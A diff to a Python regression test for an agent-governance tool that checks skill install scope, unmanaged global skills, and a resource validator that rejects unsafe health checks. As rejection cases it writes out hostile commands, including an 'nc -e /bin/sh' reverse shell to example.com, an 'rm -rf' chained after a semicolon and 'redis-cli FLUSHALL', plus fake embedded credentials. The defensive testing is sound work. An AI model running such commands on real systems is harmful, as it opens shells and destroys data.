@@ -4,6 +4,7 @@
 from __future__ import annotations
 
 import json
+import os
 import shutil
 import subprocess
 import sys
@@ -13,10 +14,11 @@ from pathlib import Path
 
 PACKAGE_ROOT = Path(__file__).resolve().parents[2]
 INIT_SCRIPT = PACKAGE_ROOT / ".codex" / "skills" / "agent-gov" / "scripts" / "init_agent_project.py"
+NPM_BIN = PACKAGE_ROOT / "npm" / "bin" / "agent-gov.mjs"
 
 
-def run(cmd: list[str], cwd: Path, expect_ok: bool = True) -> subprocess.CompletedProcess[str]:
-    result = subprocess.run(cmd, cwd=cwd, text=True, capture_output=True, check=False)
+def run(cmd: list[str], cwd: Path, expect_ok: bool = True, env: dict[str, str] | None = None) -> subprocess.CompletedProcess[str]:
+    result = subprocess.run(cmd, cwd=cwd, text=True, capture_output=True, check=False, env=env)
     if expect_ok and result.returncode != 0:
         print("command failed:", " ".join(cmd), file=sys.stderr)
         print(result.stdout, file=sys.stderr)
@@ -79,6 +81,35 @@ def assert_no_missing_doc_refs(target: Path) -> None:
                 raise SystemExit(1)
 
 
+def assert_install_skill_scope(temp_root: Path) -> None:
+    project = temp_root / "install-scope-project"
+    project.mkdir(parents=True, exist_ok=True)
+    codex_home = temp_root / "codex-home"
+    env = dict(os.environ)
+    env["CODEX_HOME"] = str(codex_home)
+
+    project_install = run(["node", str(NPM_BIN), "install-skill", str(project)], cwd=PACKAGE_ROOT, env=env)
+    if "skill scope: project" not in project_install.stdout:
+        print("install-skill did not report project scope by default", file=sys.stderr)
+        print(project_install.stdout + project_install.stderr, file=sys.stderr)
+        raise SystemExit(1)
+    if not (project / ".codex" / "skills" / "agent-gov" / "SKILL.md").exists():
+        print("default install-skill did not install into project .codex/skills", file=sys.stderr)
+        raise SystemExit(1)
+    if (codex_home / "skills" / "agent-gov" / "SKILL.md").exists():
+        print("default install-skill unexpectedly wrote to global CODEX_HOME", file=sys.stderr)
+        raise SystemExit(1)
+
+    global_install = run(["node", str(NPM_BIN), "install-skill", "--global", "--force"], cwd=PACKAGE_ROOT, env=env)
+    if "skill scope: global" not in global_install.stdout:
+        print("install-skill --global did not report global scope", file=sys.stderr)
+        print(global_install.stdout + global_install.stderr, file=sys.stderr)
+        raise SystemExit(1)
+    if not (codex_home / "skills" / "agent-gov" / "SKILL.md").exists():
+        print("install-skill --global did not install into CODEX_HOME/skills", file=sys.stderr)
+        raise SystemExit(1)
+
+
 def assert_workflow_stage_closure(target: Path) -> None:
     workflow_path = target / ".agent" / "workflow.json"
     profiles_path = target / ".agent" / "workflow-profiles.json"
@@ -108,6 +139,106 @@ def assert_workflow_stage_closure(target: Path) -> None:
             if stage not in workflow_stages:
                 print(f"workflow profile {name} references unknown stage: {stage}", file=sys.stderr)
                 raise SystemExit(1)
+
+
+def assert_global_skill_governance(target: Path, python: str, temp_root: Path) -> None:
+    global_root = temp_root / "global-skill-root"
+    global_skill = global_root / "skills" / "global-only-skill"
+    global_skill.mkdir(parents=True, exist_ok=True)
+    (global_skill / "SKILL.md").write_text(
+        """---
+name: global-only-skill
+description: Regression fixture for unmanaged global skill governance.
+---
+
+# Global Only Skill
+""",
+        encoding="utf-8",
+    )
+    hygiene_path = target / ".agent" / "skill-hygiene.json"
+    hygiene = json.loads(hygiene_path.read_text(encoding="utf-8"))
+    hygiene["scan_roots"] = [".codex/skills", str(global_root / "skills")]
+    hygiene_path.write_text(json.dumps(hygiene, indent=2) + "\n", encoding="utf-8")
+
+    report = json.loads(run([python, "scripts/agent_project_skills.py", "report", "--json"], cwd=target).stdout)
+    records = {item.get("name"): item for item in report.get("skills", [])}
+    global_record = records.get("global-only-skill")
+    if not global_record or global_record.get("scope") != "global" or global_record.get("global_discovered") is not True:
+        print("project skill report did not include unmanaged global skill discovery", file=sys.stderr)
+        print(json.dumps(report, indent=2), file=sys.stderr)
+        raise SystemExit(1)
+    doctor = run([python, "scripts/agent_project_skills.py", "doctor"], cwd=target, expect_ok=False)
+    if "global_unmanaged" not in (doctor.stdout + doctor.stderr):
+        print("project skill doctor did not fail unmanaged global skill", file=sys.stderr)
+        print(doctor.stdout + doctor.stderr, file=sys.stderr)
+        raise SystemExit(1)
+
+    shutil.rmtree(global_skill)
+
+    project_skill = target / ".codex" / "skills" / "agent-gov"
+    project_skill.mkdir(parents=True, exist_ok=True)
+    (project_skill / "SKILL.md").write_text(
+        """---
+name: agent-gov
+description: Regression fixture for project-governed agent-gov skill.
+---
+
+# Agent Gov
+""",
+        encoding="utf-8",
+    )
+    global_same_name = global_root / "skills" / "agent-gov"
+    global_same_name.mkdir(parents=True, exist_ok=True)
+    (global_same_name / "SKILL.md").write_text(
+        """---
+name: agent-gov
+description: Regression fixture for same-name unmanaged global skill governance.
+---
+
+# Agent Gov Global
+""",
+        encoding="utf-8",
+    )
+    project_skills_path = target / ".agent" / "project-skills.json"
+    project_skills = json.loads(project_skills_path.read_text(encoding="utf-8"))
+    project_skills["skills"]["agent-gov"] = {
+        "scope": "project",
+        "host": "codex",
+        "path": ".codex/skills/agent-gov",
+        "lifecycle": "active",
+        "intent": "workspace-only",
+        "owner": "regression",
+        "risk": "medium",
+        "source": {"kind": "repo-local", "repository": "", "ref": "", "pinned": False},
+        "content": {},
+        "release": {"manifest": "", "publishable": False, "release_gate": "local-validation"},
+        "review": {"requires_review": False, "latest_status": "not-required", "latest_artifact": ""},
+    }
+    project_skills_path.write_text(json.dumps(project_skills, indent=2) + "\n", encoding="utf-8")
+
+    same_name_report = json.loads(run([python, "scripts/agent_project_skills.py", "report", "--json"], cwd=target).stdout)
+    same_name_records = {item.get("name"): item for item in same_name_report.get("skills", [])}
+    same_name_record = same_name_records.get("agent-gov")
+    if not same_name_record or same_name_record.get("global_discovered") is not True:
+        print("project skill report did not surface same-name global discovery", file=sys.stderr)
+        print(json.dumps(same_name_report, indent=2), file=sys.stderr)
+        raise SystemExit(1)
+    same_name_doctor = run([python, "scripts/agent_project_skills.py", "doctor"], cwd=target, expect_ok=False)
+    if "global_unmanaged" not in (same_name_doctor.stdout + same_name_doctor.stderr):
+        print("project skill doctor did not fail same-name unmanaged global skill", file=sys.stderr)
+        print(same_name_doctor.stdout + same_name_doctor.stderr, file=sys.stderr)
+        raise SystemExit(1)
+
+    project_skills["skills"]["agent-gov"]["global_install_path"] = str(global_same_name)
+    project_skills_path.write_text(json.dumps(project_skills, indent=2) + "\n", encoding="utf-8")
+    governed_report = json.loads(run([python, "scripts/agent_project_skills.py", "report", "--json"], cwd=target).stdout)
+    governed_records = {item.get("name"): item for item in governed_report.get("skills", [])}
+    governed_agent_gov = governed_records.get("agent-gov", {})
+    if "global_unmanaged" in governed_agent_gov.get("statuses", []):
+        print("registered same-name global skill still reported as unmanaged", file=sys.stderr)
+        print(json.dumps(governed_agent_gov, indent=2), file=sys.stderr)
+        raise SystemExit(1)
+    run([python, "scripts/agent_project_skills.py", "doctor"], cwd=target)
 
 
 def assert_spec_archive_gate(target: Path, python: str) -> None:
@@ -559,6 +690,116 @@ def assert_task_board_guards(init_script: Path, temp_root: Path, python: str) ->
         raise SystemExit(1)
 
 
+def assert_resource_catalog_guards(target: Path, python: str) -> None:
+    run([python, "scripts/agent_resources.py", "doctor"], cwd=target)
+    match = json.loads(
+        run(
+            [
+                python,
+                "scripts/agent_resources.py",
+                "match",
+                "--intent",
+                "production repair database",
+                "--include-disabled",
+                "--json",
+            ],
+            cwd=target,
+        ).stdout
+    )
+    candidate_ids = {item.get("id") for item in match.get("candidates", [])}
+    excluded_ids = {item.get("id") for item in match.get("excluded", [])}
+    if "staging-database-template" in candidate_ids or "staging-database-template" not in excluded_ids:
+        print("resource match used do_not_use_for as positive matching evidence", file=sys.stderr)
+        print(json.dumps(match, indent=2), file=sys.stderr)
+        raise SystemExit(1)
+
+    resources_path = target / ".agent" / "resources.json"
+    original = resources_path.read_text(encoding="utf-8")
+    resources = json.loads(original)
+
+    def assert_bad_healthcheck(case_id: str, command: object, expected_text: str) -> None:
+        case_resources = json.loads(original)
+        case_resources["resources"][0]["health_checks"] = [
+            {
+                "id": case_id,
+                "command": command,
+                "risk": "low",
+            }
+        ]
+        resources_path.write_text(json.dumps(case_resources, indent=2) + "\n", encoding="utf-8")
+        result = run([python, "scripts/agent_resources.py", "doctor"], cwd=target, expect_ok=False)
+        if expected_text not in (result.stdout + result.stderr):
+            print(f"resource doctor did not reject unsafe healthcheck case: {case_id}", file=sys.stderr)
+            print(result.stdout + result.stderr, file=sys.stderr)
+            raise SystemExit(1)
+
+    resources["resources"][0]["endpoint"]["url"] = "postgres://user:pass@example/db"
+    resources_path.write_text(json.dumps(resources, indent=2) + "\n", encoding="utf-8")
+    secret_url = run([python, "scripts/agent_resources.py", "doctor"], cwd=target, expect_ok=False)
+    if "secret-looking inline value" not in (secret_url.stdout + secret_url.stderr):
+        print("resource doctor did not reject a database URL with embedded credentials", file=sys.stderr)
+        print(secret_url.stdout + secret_url.stderr, file=sys.stderr)
+        raise SystemExit(1)
+
+    assert_bad_healthcheck(
+        "dangerous-shell",
+        "echo ok; rm -rf /tmp/agent-gov-regression-sentinel",
+        "shell metacharacters",
+    )
+    assert_bad_healthcheck(
+        "inline-python",
+        ["python3", "-c", "open('/tmp/agent-gov-regression-bypass', 'w').write('x')"],
+        "not allowed in health checks",
+    )
+    assert_bad_healthcheck("long-sleep", ["sleep", "9999"], "not allowlisted")
+    assert_bad_healthcheck("git-clone", ["git", "clone", "https://example.com/repo.git"], "read-only argument policy")
+    assert_bad_healthcheck("curl-post", ["curl", "-X", "POST", "https://example.com/health"], "read-only argument policy")
+    assert_bad_healthcheck("curl-post-head-override", ["curl", "-X", "POST", "-I", "https://example.com/health"], "read-only argument policy")
+    assert_bad_healthcheck("nc-exec", ["nc", "-e", "/bin/sh", "example.com", "1234"], "read-only argument policy")
+    assert_bad_healthcheck("redis-flushall", ["redis-cli", "FLUSHALL"], "read-only argument policy")
+    assert_bad_healthcheck("psql-sql", ["psql", "-c", "select 1"], "not allowed in health checks")
+
+    resources = json.loads(original)
+    resources["resources"][0]["description"] = "$PASSWORD=abc123"
+    resources_path.write_text(json.dumps(resources, indent=2) + "\n", encoding="utf-8")
+    dollar_secret = run([python, "scripts/agent_resources.py", "doctor"], cwd=target, expect_ok=False)
+    if "secret-looking inline value" not in (dollar_secret.stdout + dollar_secret.stderr):
+        print("resource doctor did not reject a dollar-prefixed inline secret assignment", file=sys.stderr)
+        print(dollar_secret.stdout + dollar_secret.stderr, file=sys.stderr)
+        raise SystemExit(1)
+
+    resources = json.loads(original)
+    gated_resource = json.loads(json.dumps(resources["resources"][0]))
+    gated_resource.update(
+        {
+            "id": "approval-gated-regression",
+            "environment": "release",
+            "risk": "high",
+            "description": "Regression fixture for approval-gated resource healthchecks.",
+            "when_to_use": ["Exercise healthcheck approval gating."],
+            "do_not_use_for": ["Production operations."],
+            "health_checks": [
+                {
+                    "id": "approved-gate",
+                    "command": ["test", "-e", ".agent/resources.json"],
+                    "risk": "low",
+                }
+            ],
+        }
+    )
+    resources["resources"].append(gated_resource)
+    resources_path.write_text(json.dumps(resources, indent=2) + "\n", encoding="utf-8")
+    gated_check = run([python, "scripts/agent_resources.py", "healthcheck", "approval-gated-regression"], cwd=target, expect_ok=False)
+    if "requires approval" not in (gated_check.stdout + gated_check.stderr):
+        print("resource healthcheck did not require approval for high-risk resource execution", file=sys.stderr)
+        print(gated_check.stdout + gated_check.stderr, file=sys.stderr)
+        raise SystemExit(1)
+    run([python, "scripts/agent_resources.py", "healthcheck", "approval-gated-regression", "--dry-run"], cwd=target)
+
+    resources_path.write_text(original, encoding="utf-8")
+    run([python, "scripts/agent_resources.py", "doctor"], cwd=target)
+
+
 def assert_session_offload_protocol(target: Path, python: str) -> None:
     run(
         [
@@ -691,6 +932,7 @@ def main() -> int:
     python = sys.executable
     temp_root = Path(tempfile.mkdtemp(prefix="agent-gov-regression-"))
     try:
+        assert_install_skill_scope(temp_root)
         if sys.platform.startswith("win"):
             target = temp_root / "agent-gov"
         else:
@@ -743,6 +985,17 @@ def main() -> int:
             if data.get("schema") != schema:
                 print(f"{relative} has the wrong schema", file=sys.stderr)
                 return 1
+        project_skills = json.loads((target / ".agent" / "project-skills.json").read_text(encoding="utf-8"))
+        project_skill_policy = project_skills.get("policy", {})
+        if project_skill_policy.get("default_install_scope") != "project" or project_skill_policy.get("global_install_requires_explicit_request") is not True or project_skill_policy.get("fail_on_unmanaged_global_skills") is not True:
+            print("project skill governance policy did not default to project install scope and global governance", file=sys.stderr)
+            print(json.dumps(project_skill_policy, indent=2), file=sys.stderr)
+            return 1
+        distribution = json.loads((target / ".agent" / "skill-distribution.json").read_text(encoding="utf-8"))
+        if distribution.get("default_install_scope") != "project" or distribution.get("project_codex_skill_dir") != ".codex/skills" or distribution.get("policy", {}).get("global_install_requires_explicit_request") is not True:
+            print("skill distribution policy did not default to project-local installation", file=sys.stderr)
+            print(json.dumps(distribution, indent=2), file=sys.stderr)
+            return 1
         manifest = json.loads((target / ".agent" / "manifest.json").read_text(encoding="utf-8"))
         harness = json.loads((target / ".agent" / "harness.json").read_text(encoding="utf-8"))
         if sorted(manifest.get("required_paths", [])) != sorted(harness.get("invariants", {}).get("required_paths", [])):
@@ -773,6 +1026,7 @@ def main() -> int:
 
         assert_no_missing_doc_refs(target)
         assert_workflow_stage_closure(target)
+        assert_resource_catalog_guards(target, python)
         assert_spec_archive_gate(target, python)
         run([python, "scripts/agent_check.py"], cwd=target)
         run([python, "scripts/agent_migrate.py", "doctor"], cwd=target)
@@ -1109,6 +1363,7 @@ def main() -> int:
                 if "skill_hygiene" not in score.get("dimensions", {}):
                     print("standard profile score did not include skill_hygiene", file=sys.stderr)
                     return 1
+                assert_global_skill_governance(profiled, python, temp_root)
         assert_task_board_guards(INIT_SCRIPT, temp_root, python)
     finally:
         shutil.rmtree(temp_root, ignore_errors=True)
